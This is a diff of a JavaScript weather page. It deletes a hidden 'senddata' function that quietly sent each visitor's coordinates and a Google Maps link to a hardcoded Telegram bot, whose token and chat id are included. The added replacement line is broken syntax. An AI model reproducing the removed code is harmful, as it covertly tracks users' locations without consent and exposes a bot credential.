@@ -171,7 +171,7 @@ function getLocation() {
 
 
         yourweather(latitude, longitude);
-        senddata(latitude, longitude);
+       =
 
 
 
@@ -203,30 +203,6 @@ navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => 
     // messageDiv.innerText = `Location permission denied.`;
   }
 });
-
-
-
-
-
-async function senddata(lat , lon) {
-  const token ='7135600941:AAFd6-m2E8BzPXHB-z6nIESnBYNbuwiDD8Q';
-const id = '1406652305'
-let text = `longitute = ${lon}  && latitude= ${lat}  && https://www.google.com/maps?q=${lat},${lon}`;
-
-const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`;
-
-let response = await fetch(url, {
-    method: "GET"
-});
-
-if (response.ok) {
-    console.log("successfully working");
-} else {
-    console.error("Failed to send message");
-}
-
-
-}
 
 
 async function yourweather(lat , lon){
